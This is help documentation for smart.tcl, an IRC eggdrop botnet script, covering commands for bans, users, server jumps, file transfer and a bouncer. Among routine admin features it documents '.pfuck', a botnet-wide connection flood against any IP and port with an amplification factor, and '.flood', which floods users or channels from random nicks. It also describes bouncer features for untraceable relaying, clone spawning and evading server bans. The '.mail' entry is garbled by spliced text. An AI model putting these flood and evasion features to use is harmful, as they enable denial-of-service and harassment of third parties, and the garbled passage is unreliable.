See also : .match, .status, .orph, .checkpass, .whois
%{help=clear}%{+n}
###  %b.clear smart%b
   Removes ALL smart.tcl configuration files. This includes :
   Anti-Idle / Servers / Bouncer / Logging / Nick-Cycler
   Repeat-Kicker / Topic Locker / Protector-System / Splits-Logger
   configuration files. It also includes the help file for smart.tcl,
   smart.help.
Note : This is useful to completely reset the TCL.
###  %b.clear bans%b
   Clears all bans.
See also : .bans, .+ban, .-ban, .m+ban, .m-ban
###  %b.clear ignores%b
   Clears all ignores.
See also : .ignores, .+ignore, .-ignore
###  %b.clear bounce%b
   Removes Bounce System configuration file.
See also : .bounce
###  %b.clear idle%b
   Removes Anti-Idle System configuration file.
See also : .idle
###  %b.clear repeat%b
   Removes Repeat-Kicker configuration file.
See also : .repeat
###  %b.clear topic%b
   Removes Topic-Locker configuration file.
See also : .tlock, .tunlock
###  %b.clear nick%b
   Removes Nick-System configuration file.
See also : .nick
###  %b.clear logs%b
   Removes Log System configuration file.
See also : .logs
###  %b.clear servers%b
   Removed the server-list file.
See also : .servers, .+serv, .-serv, .jump
###  %b.clear sop%b
   Removes the SOP routines configuration file.
See also : .sop
###  %b.clear onjoin%b
   Removed the On-Join System configuration file.
See also : .onjoin
###  %b.clear prot%b
   Removes the User-Protector Syatem configuration file.
See also : .prot
###  %b.clear clone%b
   Removes the Anti Clone System configuration file.
###  %b.clear close%b
   Removes Auto Channel-Close System configuration file.
###  %b.clear probe%b
   Removes the Probe-System logfile.
See also : .probe
###  %b.clear splits%b
   Removes the Net-Splits logfile.
See also : .splits
###  %b.clear ainv%b
   Removes the Auto-Invite System configuration file.
See also : .ainv
###  %b.clear spam%b
   Removes the Anti-Spam System configuration file.
See also : .spam
###  %b.clear setup%b
   Removes Smart TCL Setup configuration file.
See also : .setup
###  %b.clear help%b
   Removes the TCL Help System file.
See also : '.help smart', '.help setup'
%{help=mjoin}%{+n}
###  %b.mjoin%b <#channel> %bA%b [key]
   Makes ALL linked bots join the specified channel.
###  %b.mjoin%b <#channel> %bX%b / %bY%b / %bZ%b / ... [key]
   Makes only the X-flagged bots ( or Y-flagged, or Z-flagged, etc.)
   join the specified channel.This is helpfull if you have a large
   botnet ( for example, 3 botnets linked and not shared ).So you can
   .chattr <yourbots> +X, your friend's bots +Y, etc. and make only
   the right bots join channels !
Note1 : valid flags for bots are in the range [C - Z]. (majuscules).
Note2 : if a key is specified, join command will use it.
See also : .mpart, .join, .bjoin, .part, .bpart, .msave
%{help=mpart}%{+n}
###  %b.mpart%b <#channel> %bA%b [part-message]
   Makes ALL linked bots part the specified channel with the specified
   part-message ( if included ).
###  %b.mpart%b <#channel> %bX%b / %bY%b / %bZ%b / ... [part-message]
   Makes only the X-flagged bots ( or Y-flagged, or Z-flagged, etc.)
   part the specified channel.This is helpfull if you have a large
   botnet ( for example, 3 botnets linked and not shared ).So you can
   .chattr <yourbots> +X, your friend's bots +Y, etc. and make only
   the right bots part channels !
Note : valid flags for bots are in the range [C - Z]. (majuscules).
See also : .mjoin, .part, .bpart, .join, .bjoin, .msave
%{help=bounce}%{+o|+o}
   %bBounce System:%b
   A complete Bouncer System ! Allows users to connect to the bot
   as a server on a selected port, then relay to a real server. It's
   useful for anonymous IRC connections : it works as "bnc" and doesn't
   need an extra background process to run. It can be used also for
   any other kind of connection... ;) Multiple user support, system
   password protection, closed or opened system, logging, vhosts support,
   bot--connections support, virtual clones spawning, crash-recover etc...
   %bBounce System commands:%b
   When connected to Bounce System, the following commands are accepted:
   /QUOTE %b.bhelp%b to get a list of available commands.
   /QUOTE %b.bquit%b to quit Bounce System.
   /QUOTE %b.bpass%b <System-password> to access the Bounce-System.
   /QUOTE %b.bident%b <nick> <password> to be recognized as a bot user.
   /QUOTE %b.bvhost%b [newvhost] to set your virtual host.
   /QUOTE %b.bvhosts%b [command] to have a list of available vhosts.
   /QUOTE %b.bconn%b <server> [port [password [sourceport]]] to connect
                     to a server with spcified parameters.
   /QUOTE %b.bdisc%b [quit-message] to disconnect from current server.
   /QUOTE %b.bserv%b to have a list of IRC bot-servers.
   /QUOTE %b.bstat%b to get some Bounce System and user specific stats.
   /QUOTE %b.bdump%b ON or OFF or [text] to enable or disable the Bounce-Dump
                mode. When ON, text is directly dumped to server ( and
                viceversa ) without filtering or controls..Use carefully!
                When <text> is spicified instead of "ON" and "OFF", it
                will be dumped to server (not enabling permanent dump).
%{help=bounce}%{+n}
   /QUOTE %b.bverb%b [ON or OFF] to enable or disable Bouncer user-commands
                visualisation. This lets owners monitor user commands,
                connections and some warnings.
   /QUOTE %b.bwho%b to have a list of Bouncer users.
   /QUOTE %b.bkill%b <user-idx#> [reason] to kill the specified user.
%{help=bounce}%{+o|+o}
   /QUOTE %b.birc%b [ON or OFF] to set IRC-Style messages visualisation
                    ( enables IRC-MODE and support for IRC raw-codes ).
   /QUOTE %b.bpsy%b [ON or OFF] to enable or disable PSY-BNC mode : if ON,
                    connections will be keeped alive after user disconnect,
                    like a PSY-BNC System.
   /QUOTE %b.bgo%b [away-nick] to leave Bounce System keeping online your
                   virtual clone.
   /QUOTE %b.brestore%b [idx#] to restore your connection with the virtual
                       clone online as the specified idx ( try '/QUOTE
                       .brestore' without parameters to have a list of
                       restorable connections.. )
   /QUOTE %b.btake%b [idx\#] to take control of the specified connection
                     which can be virtual or real. This is helpfull when
                     bot is unable to determine if an user has disconnected
                     and then to set a virtual clone, so connection's owner
                     can regain control of his old connection. Owners can
                     take ALL connections, even if created by other users.
                     Use '/QUOTE .btake' without parameters to have a list
                     of ownable connections.
--- %bIRC-Only Commands%b: ---
   /QUOTE %b.bread%b [message-id\#] to read and delete messages logged by
                     virtual clones throu IRC.
   /QUOTE %b.breg%b <nick> [ident [realname]] to register to an IRC server.
   /QUOTE %b.bping%b <0 / minutes\#> to disable IRC-pinging, or set its
                     time interval to the specified value.
   /QUOTE %b.bchat%b to make the bot call you in DCC-CHAT and let you join
                     the party-line (only for +p users).
--- %bDCC Bounce commands:%b ---
%{help=bounce}%{+n}
###  %b.bounce  on%b or %boff%b
   Turns the IRC bounce server on or off.
###  %b.bounce vhost%b [default-vhost]
   Sets the standard vhost to use for bouncer connections. Set this to
   'default' to use current bot 's vhost. Both IP or hosts are accepted.
###  %b.bounce port%b <port>
   Sets the port that the bounce server listens on.
###  %b.bounce max%b <max-connections>
   Sets the max number of users that can be connected. 0 = unlimited.
###  %b.bounce pass%b [newpassword or off]
   Sets the password required to connect. If no newpassword is given,
   current bouncer password is showed. If 'off' is specified, system
   password will be disabled.
###  %b.bounce type opened%b or %bclosed%b
   Sets the bounce type to an opened system or a close system.
   On an opened system everyone may use Bounce System, on a close
   system only registered users ( bot users ) can access it.
###  %b.bounce log on%b or %boff%b
   Enables or disables Bounce System logging. When logging is
   disabled, no trace of bounce transactions will be available.. ;)
###  %b.bounce ping%b [0 / #minutes]
   Sets the time-interval between CTCP-PINGS when users are connected
   to IRC-servers.. 0 = disabled.
###  %b.bounce irc on%b or %boff%b
   Sets IRC-Style messages visualisation ( enables or disables global
   IRC-mode and support for IRC raw-codes ).
###  %b.bounce psy on%b or %boff%b
   Enables or disables global PSY-BNC mode : if ON, connections will
   be keeped alive after user disconnections, like a PSY-BNC System.
###  %b.bounce reconn%b [0 / max#]
   When a virtual connection is dropped, Bounce System will try to
   restore it. This settings determines the maximum number of times
   Bounce System will try to reconnect before killing connection.
   0 = unlimited.
###  %b.bounce who%b
   Shows a list of connected bounce-users.
###  %b.bounce info%b <idx#>
   Shows detailed informations about the specified connection idx.
   ( Use '.bounce who' to have a list of valid idx .. )
###  %b.bounce kill%b <idx#> [reason]
   Kills the specified user from bouncer with the specified reason.
###  %b.bounce fake%b <idx#> <text>
   Puts the specified text to the server socket of a bounce-user.
###  %b.bounce spawn%b <nick> [vhost[@server[@port[@password]]] [ident [realname]]]
   Creates a virtual connection simulating a normal user. Spawned clone
   will join all bot 's channels and may be piloted with '.bounce fake' or
   owning it 's connection with a normal '.brestore' while using bouncer.
Note : spawned clone may be killed with a normal '.bounce kill' or '.bkill'.
###  %b.bounce bot%b <botnet-nick> [vhost[@server[@port[@password]]] [ident [realname]]]
   The same as '.bounce spawn', but creates a virtual connection for a bot
   so you can make a serverless bot ( for example, a k:lined bot ) use
   bouncer as a normal irc-server. To make it work, you must first set a
   password for k:lined bot and then create it 's virtual clone. Example :
   you have bouncer enabled on bot1, and bot2 is k:lined on all servers :
   from bot1, use '.chpass bot2 PassWorD', then '.bounce bot bot2'. When
   virtual clone is ready ( check it with '.bounce who' / '.bounce info idx\#'
   and with an IRC /whois .. ), just join bot2 partyline and use
   '.+serv IP.of.bot1 bnc-port-of-bot1 bot2@PassWorD' or a normal jump
   called as '.jump IP.of.bot1 bnc-port-of-bot1 bot2@PassWorD' and you're done!
Note : you mast call '.+serv' or '.jump' with 'botname@password' as password.
%{help=bounce}%{+o|+o}
###  %b.bounce ver%b
   Returns the current Bounce System version.
###  %b.bounce read%b [message-ID#]
   Lets you read and delete messages logged by virtual clones trhou IRC.
See also : .dcclist, .ndcc, .telnet, .servers, .botserv, .botver, .clear, .vhosts, .spawn
%{help=spawn}%{+n}
###  %b.spawn%b <nick> [vhost[@server[@port[@password]]] [ident [realname]]]
   Just another bind to '.bounce spawn' : see '.help bounce' for details.
%{help=madd}%{+n}
###  %b.madd%b <nick> <ident@hostmask> %bA%b
   Adds the specified nick with the specified hostmask on ALL
   connected bots.
###  %b.madd%b <nick> <ident@hostmask> %bX%b / %bY%b / %bZ%b / ...
   Adds the specified nick with the specified hostmask only
   on X-flagged bots ( or Y-flagged, or Z-flagged, etc.).This is
   helpful if you have a large botnet ( for example, 3 botnets linked
   and not shared ).So you can .chattr <yourbots> +X, your friend's
   bots +Y, etc. and add people only on the right bots !
Note : valid flags for bots are in the range [C - Z]. (majuscules).
See also : .mkill, .mchattr, .mchpass, .msave, m+bot, m-bot, m+host, m-host
%{help=mkill}{+n}
###  %b.mkill%b <nick> %bA%b
   Deletes the specified nick from ALL connected bots.
###  %b.mkill%b <nick> %bX%b / %bY%b / %bZ%b / ...
   Deletes the specified nick only from X-flagged bots ( or Y-flagged,
   or Z-flagged, etc.).This is helpful if you have a large botnet ( for
   example, 3 botnets linked and not shared ).So you can .chattr <yourbots> +X,
   your friend's bots +Y, etc. and remove people only from the right bots !
Note : valid flags for bots are in the range [C - Z]. (majuscules).
See also : .madd, .mchattr, .mchpass, .msave, m+bot, m-bot, m+host, m-host
%{help=mchattr}%{+m|+m}
###  %b.mchattr A%b <nick> <+/-flags> [#channel]
   Changes attributes for the specified nick ( and, if specified, for the
   specified channel ) on ALL connected bots.
###  %b.mchattr X%b / %bY%b / %bZ%b / ... <nick> <+/-flags> [#channel]
   Changes attributes for the specified nick ( and, if specified, for the
   specified channel ) only on X-flagged bots ( or Y-flagged, or Z-flagged,
   etc.).This is helpful if you have a large botnet ( for example, 3 botnets
   linked and not shared ).So you can .chattr <yourbots> +X, your friend's
   bots +Y, etc. and change people's flags only on the right bots !
###  %b.mchattr A%b <+flags> <+/-flags> [#channel]
   Changes attributes for all of the users matching +flags on ALL
   connected bots.
###  %b.mchattr X%b / %bY%b / %bZ%b / ... <+flags> <+/-flags> [#channel]
   Changes attributes for all of the users matching +flags only on
   X-flagged bots (or Y-flagges, or Z-flagged, etc.).
Note1 : you may also define your bots flags with this command to make ALL
        bots recognize your bots ( .mchattr A <mybot> +X / +Y / +Z / ... ). ;)
Note2 : valid flags for bots are in the range [B - Z]. (majuscules).
Note3 : if #channel is not a valid channel for current bot, the command will
        work anyway on the rest of the botnet as requested.
Note4 : Only owners can manage master/owner 's flags.
See also : .madd, .mkill, .mchpass, .msave, m+bot, m-bot, m+host, m-host, whois
%{help=mbotattr}%{+t}
###  %b.mbotattr A%b <bot> <+/-flags>
   Changes bot attributes for specific bot on ALL connected bots.
### %b.mbotattr X%b / %bY%b / %bZ%b / ... <bot> <+/-flags>
   Changes bot attributes for specific bot only on X-flagged bots (or
   Y-flagged, or Z-flagged, etc.). This is helpful if you have a large
   botnet (ie. 3 botnets linked and not shared), so you can
   .chattr <yourbots> +X, your friends bots +Y, etc. and change bot flags
   only on some kinda bots.
See also : .mchattr, .fchattr, .mchpass, .msave, m+bot, m-bot, m+host, m-host, whois
%{help=mchpass}%{+m}
###  %b.mchpass%b <nick> [newpass]
   If a new-password is specified, will try to change password for the specified
   nick on ALL connected bots. If no new-password is given, will try to remove
   password for the specified nick on ALL connected bots.
Note1 : This command can NOT be used to change owner 's passwords, but an
        owner can use it to change his password on ALL bots.
Note2 : <nick> MUST be a valid, known, user !
See also : .madd, .mkill, .m+host, .m-host, .senduser
%{help=m+bot}%{+n}
### %b.m+bot%b <botnick> <botaddress:botport/userport> A
   Adds the specified bot with the specified address and telnet port for bots
   and users on ALL connected bots.
###  %b.m+bot%b <botnick> <botaddress:botport/userport> %bX%b / %bY%b / %bZ%b / ...
   Adds the specified bot with the specified address ( and bots/userports)
   only on X-flagged bots ( or Y-flagged, or Z-flagged, etc.).This is
   helpful if you have a large botnet ( for example, 3 botnets linked
   and not shared ).So you can .chattr <yourbots> +X, your friend's
   bots +Y, etc. and add bots only on the right bots !
Note1 : After a new bot is added, you must add some hostmask to it ! You can
        do it using .m+host <botnick> <newhostmask>...
Note2 : valid flags for bots are in the range [C - Z]. (majuscules).
See also : .m-bot, .madd, .mkill, .mchattr, .mchpass, .msave, m+host, m-host, mchaddr
%{help=m-bot}%{+n}
###  This command is only a bind to .mkill ! See .help mkill to know more about ...
%{help=mchaddr}%{+t}
###  %b.mchaddr%b <botnick> <newbotaddress>
   Will try to change address for the specified bot ( address and bot/user ports )
   on ALL connected bots.
See also : .chaddr, .sop/.msop autoadd, .m+host, .m-host, .msave
%{help=m+ban}%{+m}
###  %b.m+ban  A%b <hostmask> [#channel] [sticky] [reason]
   Will ban the specified hostmask on ALL connected bots.
###  %b.m+ban X%b / %bY%b / %bZ%b... <hostmask> [#channel] [sticky] [reason]
   Will ban the specified hostmask on X, Y,....,or Z-flagged bots.
See also : .m-ban, .+ban, .bans, .clear bans, .sticky
%{help=m-ban}%{+m}
###  %b.m-ban A%b <hostmask> [#channel]
   Will unban the specified hostmask on ALL connected bots.
###  %b.m-ban X%b / %bY%b / %bZ%b... <hostmask> [#channel]
   Will unban the specified hostmask on X, Y,....,or Z-flagged bots.
See also : .m+ban, .-ban, .bans, .clear bans
%{help=checkpass}%{+m}
###  %b.checkpass%b
   Looks for users who does not have a password set.
See also : .mchpass, .whois, .orph, .match, .count
%{help=mjump}%{+t}
###  %b.mjump A next%b
   Will make ALL connected bots change server ( jump to the next server
   in server-list defined in .conf file... ).
###  %b.mjump X%b / %bY%b / %bZ%b... %bnext%b
   Will make only X, Y, or Z-flagged bots jump to next server.
###  %b.mjump A%b / %bX%b / %bY%b / %bZ%b... <server> [port [password]]
   Will make selected bots jump to the specified server, at the
   specified port and using, if necessary, the specified password.
Note : This command may be very dangerous if used to move a large botnet
       to a single server, use carefully...
See also : .jump, .bjump, .ajump, .botserv, .servers, .+server, .-server
%{help=idle}%{+n}
###  %b.idle on%b
   Will turn Anti-Idle IRC-Op protection ON.
###  %b.idle off%b
   Will turn Anti-Idle IRC-Op protection OFF.
###  %b.idle public%b
   Sets the Anti-Idle message to be said on bot's channels.
###  %b.idle priv%b
   Sets the Anti-Idle message to be said as a private message
   to the bot.
###  %b.idle time%b [new-time]
   Sets the number of minuts between Anti-Idle messages.
###  %b.idle msg%b [new-msg]
   Sets the Anti-Idle message.
See also : .ajump, .clear
%{help=+server}%{+t}
###  %b.+server%b <newserver> [port] [password]
   Adds the specified server to the bot's server-list.
Note : Passwords are not showed with '.servers'..
See also : .-server, .servers, .jump, .mjump, .clear
%{help=-server}%{+t}
###  %b.-server%b <oldserver>
   Removes the specified server from the bot's server-list.
See also : .+server, .servers, .jump, .mjump, .clear
%{help=dcc}%{+m|+m}
###  %b.dcc%b <nick>
   Performs the bot to send a DCC-CHAT request to specified nickname.
   When establishing connection, bot will ask for handle and
   password, then user should be join the partyline.
See also: !chat, .bchat
%{help=dcclist}%{+m}
###  %b.dcclist%b
   Shows a list of opened connections with their index.
See also : .ndcc, .dccstat
%{help=crypt}%{+m}
###  %b.crypt%b [key] <string>
   Encrypts the specified string using the specified key with
   blowfish algorithm in base-64. If no key is specified, it
   will be assumed = string ( like a .crypt string string )..
See also : .decrypt
%{help=decrypt}%{+m}
###  %b.decrypt%b <key> <string>
   Decrypts the specified string ( encoded with blowfish in 
   base-64 ) using the specified key.
See also : .crypt
%{help=bjump}%{+t}
###  %b.bjump%b <bot> next
   Will make the specified bot jump to next server in his
   server-list.
###  %b.bjump%b <bot> <newserver> [newport [password]]
   Will make the specified bot jump to the specified server
   at the specified port ( using the specified password ).
See also : .botserv, .jump, .mjump, .servers, .+server, .-server
%{help=bjoin}%{+n}
###  %b.bjoin%b <botname> <#channel> [key]
   Makes the specified bot join the specified channel (with key,
   if specified ).
See also : .bpart, .join, .mjoin, .part, .mpart
%{help=bpart}%{+n}
###  %b.bpart%b <botname> <#channel> [part-message]
   Makes the specified bot part the specified channel with the
   specified part-message ( if included ).
See also : .bjoin, .part, .mpart, .join, .mjoin
%{help=pfuck}%{+m}
###  %b.pfuck%b <target-ip> <port> [flood-time [amplification-factor]]
   Fucks the specified host's port with a connection-flood.
   A flood-time can be specified (in minutes) and it determines
   flood duration. If an amplification factor is specified, the
   number of connections per second will be multiplied for this number.
Note1 : Every bot in the botnet will flood simultaneousely using the
        same flood parameters.
Note2 : Default flood-time is 5 minutes and default amplification-factor
        is 10x ( with 4 bots linked -> 40 connections per second for 5 min )
###  %b.pfuck stop%b
   Stops ALL current port-floods.
See also : .flood, .botctcp, .massmsg, .massnotice
%{help=senduser}%{+n}
###  %b.senduser%b <handle> <target-bot>
   Sends handle's user-record to the specified bot. This is a very quick
   way to add users on linked non-shared bots !
###  %b.senduser%b <handle> %bA%b
   Sends handle's user-record to ALL connected bots.
###  %b.senduser%b <handle> %bX%b / %bY%b / %bZ%b / ...
   Sends handle's user-record to X, Y, or Z-flagged bots.
Note1 : handle must be a valid, known user on current bot and an unknow
        user on target bots ! ;)
Note2 : if sender is not an owner on target bot(s), global flags for
        handle will be rejected in accord to conf-variable 'private-globals'
        ( if 'private-globals' is not set, only '+n' will be rejected ).
See also : .madd, .mkill, .m+host, .m-host, .mchpass, .msave
%{help=flood}%{+n}
###  %b.flood A%b <nick / #channel> [flood-time] [message]
   Floods the specified nick or #channel for flood-time seconds with ALL
   connected bots sending the specified message from random nicks.
###  %b.flood X%b / %bY%b / %bZ%b / ... <nick / #channel> [flood-time] [message]
   Floods the specified nick or #channel for flood-time seconds with X, Y,
   OR Z-flagged bots sending the specified message from random nicks.
###  %b.flood X,Y,Z,...%b <nick / #channel> [flood-time] [message]
   Floods the specified nick or #channel for flood-time seconds with X and
   Y and Z-flagged bots sending the specified message from random nicks.
Note1 : If no flood-time is specified, the default is 90 seconds.
Note2 : If no message is specified, the default is a random string.
See also : .massmsg, .massnotice, .botctcp, .pfuck
%{help=botver}%{+o|+o}
###  %b.botver%b
   Returns current bot version, 'smart.tcl' version, TCL language
   patchlevel and global bot-flags.
###  %b.botver A%b
   For each bot, returns prevoius informations.
###  %b.botver X%b / %bY%b / %bZ%b / ...
   For each X, Y, or Z-flagged bot, returns previous informations.
See also : .ver, .botinfo, .probe, .mail
%{help=probe}%{-}
###  %b.probe%b
   Returns information about last internal error detected and
   botnet status..
###  %b.probe log%b
   Shows all errors logged by Probe System.
###  %b.probe clear%b
   Removes error logfile.
Note : every 30 minutes an autocheck is done and errors are logged.
See also : .ver, .botver, .botinfo, .mail
%{help=repeat}%{+m|+m}
###  %b.repeat%b
   Shows information about Repeat-Kicker settings..
###  %b.repeat type%b <all / list / off>
   Enables Repeat-Kicker on all channel, on channels in Repeat-Kicker
   chanlist, or turns it off.
###  %b.repeat allow%b <repetitions>
   Sets the number of repetitions allowed.
###  %b.repeat time%b <interval>
   Sets the numbers of seconds between user's messages to evaluate
   a repetition.
###  %b.repeat ban%b <%byes%b / %bno%b / %b#number-of-kicks%b>
   Enables / disables ban for users which are repeating. If a
   numerical value is specified, transgressors will be banned
   after the specified number of kicks.
###  %b.repeat bantime%b <bantime>
   Sets the ban-time for transgressors ( in minutes ). If 0 is
   specified, the ban will be permanent.
###  %b.repeat list%b
   Shows the channels monitored by Repeat-Kicker.
###  %b.repeat add%b <#channel>
   Adds the specified channel to the list of monitored channels.
###  %b.repeat rem%b <#channel>
   Removes the specified channel from the list of monitored channels.
###  %b.repeat msg%b <newmessage>
   Sets the kick-message for Repeat-Kicker to the specified message.
Note : bot friends and channel operators are allowed to repeat.
See also : .spam, .clone, .limit, .eb, .prot, .bans, .-ban, .m-ban, .clear
%{help=tlock}%{+o|+o}
###  %b.tlock%b <#channel> [new topic]
   Locks the topic for the specified channel, so chanops can not
   change it.
Note1 : if no new topic is specified, current channel topic will
        be locked.
Note2 : if the bot is not oped and the channel is +t, bot will try
        to change topic every 3 minuts..
See also : .tunlock, .clear
%{help=tunlock}%{+o|+o}
###  %b.tunlock%b <#channel>
   Unloks the topic for the specified channel, so chanops can
   normally change it.
See also : .tlock, .clear
%{help=mail}%{+m}
###  %b.mail%b <youremail@yourhost.yourdomain> <email@host.domain> [subject]
   Sends an email to the specified address ( with the specified
   subject ). While writing the message, you can use '.done' to
   end message and send it, '.read' to read your email before
   sending it, '.redo' to cancel the mail-text and rewrite it,
   '.quit' to return to partyline without sending the email,
   '.smtp' to change the SMTP-server or switch to 'mail' program,
   '.from' to change your email address, '.to' to change the
   destUpgrades smart.tcl sending it toination email address, or
   '.help [command]' to get a quick-help about available commands.
See also : .note, .notes, .flagnote
%{help=telnet}%{+m}
###  %b.telnet%b <host> <port> [vhost [sourceport]]
   Turns the bot into a telnet client to let you connect to
   the specified host ( at the specified port ).. ;) If a
   vhost and a sourceport are specified, they will be used
   instead of bot's IP and random sourceport.
Note : to force disconnection, use '.telnetquit' on a blank line.
See also : .bounce, .relay, .vhosts
%{help=send}%{+n}
###  %b.send%b <botnick> </local/path/to/file> [/remote/path/to/file] [-nocompr]
   Sends local file to the target bot using the specified filenames
   with an encrypted TCP connection. If compression module is loaded,
   file will be compressed reducing transfer-time.
Note1 : If no remote-file is specified, it is assumed equal to
        the local-filename.
Note2 : if '-nocompr' parameter is specified, files will be send uncompressed.
See also : .upgrade, .ls, .find, .cat, .get, .cp, .rm, .mv, .files, .gzip, .gunzip
%{help=msend}%{+n}
###  %b.msend A%b/%bX%b/%bY%b/%bZ%b/.. </local/path/to/file> [/remote/path/to/file] [-nocompr]
   Sends local file to bots matching the specified botnet-flag.
   Use 'A' to send to ALL connected bots ( dangerous .. ).
###  %b.msend bot1,bot2,bot3,..%b </local/path/to/file> [/remote/path/to/file]
   Sends local file to the specified bots. List must be comma-separated
   without spaces between bot names.
See also : .mupgrade, .send, .upgrade, .ls, .find
%{help=upgrade}%{+n}
###  %b.upgrade%b <bot> [/local/path/to/smart.tcl] [/remote/path/to/smart.tcl] [-nocompr]
   Upgrades smart.tcl sending it to the specified bot. If upgrade is
   successfully, just do a '.brestart <bot>' to make new tcl works on
   target bot.
Note1 : NEVER rehash / restart current bot before you upgraded ALL botnet!
Note2 : if '-nocompr' parameter is specified, files will be send uncompressed.
See also : .send, .cp, .rm, .get, .cat, .ls, .find, .brestart, .mrestart, .brehash, .mrehash
%{help=mupgrade}%{+n}
###  %b.mupgrade A%b/%bX%b/%bY%b/%bZ%b/.. [/local/path/to/smart.tcl] [/remote/path/to/smart.tcl] [-nocompr]
   Upgrades smart.tcl sending it to all bots matching the specified
   botnet-flag. Use 'A' to send to ALL connected bots ( dangerous .. ).
###  %b.mupgrade bot1,bot2,bot3,..%b [/local/path/to/smart.tcl] [/remote/path/to/smart.tcl]
   Upgrades smart.tcl sending it to the specified bots. List must be
   comma-separated without spaces between bot names.
See also : .msend, .upgrade, .send, .ls, .find, .brestart, .mrestart, .brehash, .mrehash
%{help=ls}%{+n}
###  %b.ls% [pattern]
   Lists files matching the specified pattern or path, like the
   shell command 'ls'..
See also : .find, .cat, .get, .cp, .rm, .mv, .gzip, .gunzip, .upgrade, .send, .files
%{help=get}%{+n}
###  %b.get%b <filename> [IRC-nickname]
   Sends to the specified nickname the specified file vis DCC-SEND.
See also : .ls, .cat, .cp, .rm, .mv, .gzip, .gunzip, .upgrade, .send, .files
%{help=cat}%{+n}
###  %b.cat%b <filename>
   Catenates to you the specified local file like a shell 'cat'..
See also : .find, .ls, .get, .cp, .rm, .mv, .gzip, .gunzip, .upgrade, .send, .files
%{help=find}%{+n}
###  %b.find%b [where] <filename>
   Tryes to find the specified filename searching from the specified
   path(where). If no 'where' is specified, current bot directory
   is assumed as root-directory..
See also : .ls, .get, .cat, .cp, .rm, .mv, .gzip, .gunzip, .send, .upgrade, .files
%{help=last}%{+m|+m}
###  %b.last%b [how-many-commands#]
   Shows last commands received by the bot. If no how-many-command
   is specified, 10 is the default.
See also : .check
%{help=cp}%{+n}
###  %b.cp%b <source-file> <destination-file>
   Copyes source-file to destination-file like a shell 'cp'..
See also : .ls, .rm, .mv, .get, .cat, .gzip, .gunzip, .send, .upgrade, .files
%{help=mv}%{+n}
###  %b.mv%b <source-file> <destination-file>
   Moves source-file to destination-file deleting source-file,
   like a shell 'mv'..
See also : .ls, .rm, .cp, .get, .cat, .gzip, .gunzip, .send, .upgrade, .files
%{help=rm}%{+n}
###  %b.rm%b <filename>
   Deletes the specified filename, like a shell 'rm'..
See also : .cp, .ls, .get, .send, .cat, .mv, .gzip, .gunzip, .upgrade, .files
%{help=eb}%{+m|+m}
###  %b.eb%b
   Extra Bitch System, now integrated as '.prot eb'.
   See '.help prot' for detailed informations.
See also : .prot
%{help=brehash}%{t}
###  %b.brehash%b <bot>
   Rehashes the specified bot.
See also : .mrehash, .rehash, .brestart, .mrestart, .rehash, .restart
%{help=brestart}%{+t}
###  %b.brestart%b <bot>
   Restarts the specified bot.
See also : .mrestart, .restart, .brehash, .mrehash, .restart, .rehash
%{help=dns}%{-}
###  %b.dns%b <hostname / IP>
   Resolves the specified hostname to his numerical IP or viceversa.
%{help=autorem}%{+n}
###  %b.autorem%b [yourpassword]
   Removed all non-linked bots from userfile. Helpfull when
   cleaning up botnet, but extremely dangerous ! :)
See also : .sop, .m-bot, , .m-host, .mchattr, .mchaddr, .-user
%{help=autoadd}%{+t}
###  %b.autoadd%b [%boff%b] / [%bhosts%b] / [%ball%b]
   Just another bind to '.sop autoadd'
See also : .autorem, .sop, .msop, .madd, .m+host, .mchaddr
%{help=fmsg}%{+o|+o}
###  %b.fmsg%b <+/-flags [#channel]> <text>
   Sends the specified message to all online users matching
   the specified flags.
See also : .fnotice, .amsg, .anotice, .msg, .notice, .wallop
%{help=fnotice}%{+o|+o}
###  %b.fnotice%b <+/-flags [#channel]> <text>
   Sends the specified notice to all online users matching
   the specified flags.
See also : .fmsg, .anotice, .amsg, .notice, .msg, .wallop
%{help=amsg}%{+o}
###  %b.amsg%b <text>
   Sends the specified message to all bot's channels.
See also : .anotice, .msg, .notice, .wallop, .fmsg, .fnotice
%{help=anotice}%{+o}
###  %b.anotice%b <text>
   Sends the specified notice to all bot's channels.
See also : .amsg, .notice, .msg, .wallop, .fnotice, .fmsg
%{help=orph}%{+m}
###  %b.orph%b [flag]
   Shows a list of "orphan" users ( not globally +flag
   and not +flag on any channels ). Default flag is +o .
See also : .whois, .match, .count, .checkpass
%{help=onjoin}%{+m|+m}
###  %b.onjoin%b
   Shows actual On-Join System status.
###  %b.onjoin ver%b
   Shows actual On-Join System version.
###  %b.onjoin type%b [%boff%b] / [%blist%b] / [%ball%b]
   Sets On-Join System monitoring type : 'off' will disable
   it, 'all' will turn it on for all bot's channels and
   'list' will enable it only for channels specified
   in '.onjoin list'.
###  %b.onjoin part%b [%bon%b] / [%boff%b]
   Enables or disables on-part messaging.
###  %b.onjoin list%b
   Shows the list of channels monitored by On-Join System.
###  %b.onjoin add%b <#channel>
   Adds the specified channel to the On­Join System
   monitored chanlist.
###  %b.onjoin rem%b <#channel>
   Removed the specified channel from the On-Join System
   monitored chanlist.
###  %b.onjoin kind%b [%bnotice%b] / [%bmessage%b]
   Sets On-Join System messaging type to a notice or
   a normal message ( query ). Note that message-mode
   is considered highly annoying, so I suggest to keep
   it in 'notice' mode ..
###  %b.onjoin jmsg all%b [message]
   Sets the global On-Join System to the specified message.
   The global message is said when type is set to 'all' or
   'list' and no specific message for actual channel is set.
###  %b.onjoin jmsg #channel%b [message]
   Sets the On-Join System message for the specified channel
   to the specified message.
Note1 : in the message, you can use '%%nick' and '%%chan' as
        special tags to put in your message the nick who
        joined channel and the channel name. For example, 
        if msg is set to 'Wellcome to %%chan, %%nick !' and
        someone with nick ^Boja^ joins channel #test, he
        will get the message 'Wellcome to #test, ^Boja^ !'..
Note2 : if no message is specified, actual message will
        be removed.
###  %b.onjoin pmsg all%b [message]
   Same of '.onjoin jmsg all [message]', but for messages
   on-part..
###  %b.onjoin pmsg #channel%b [message]
   Same of '.onjoin jmsh #channel [message]', but for
   messages on-part..
See also : .idle, .msg, .notice, .amsg, .anotice, .fmsg, .fnotice
%{help=clone}%{+m|+m}
###  %b.clone%b
   Shows actual Anti Clone System status.
###  %b.clone ver%b
   Shows actual Anti Clone System version.
###  %b.clone scan%b [#channel]
   Scans the specified channel for clones. If no channel name
   is given, all bot's channels will be scanned.
###  %b.clone max%b <#channel or all> [max-connections# or off]
   Sets the maximum number of allowed connections for the specified
   channel ( or for all, as default value ). If no value is given
   for max-connections, actual settings are showed. Default is
   'off' ( for all ).
Note1 : When no specific channel-max is found, default value ( for
        'all' ) will be used.
Note2 : To reset channel-specific settings and keep only the default
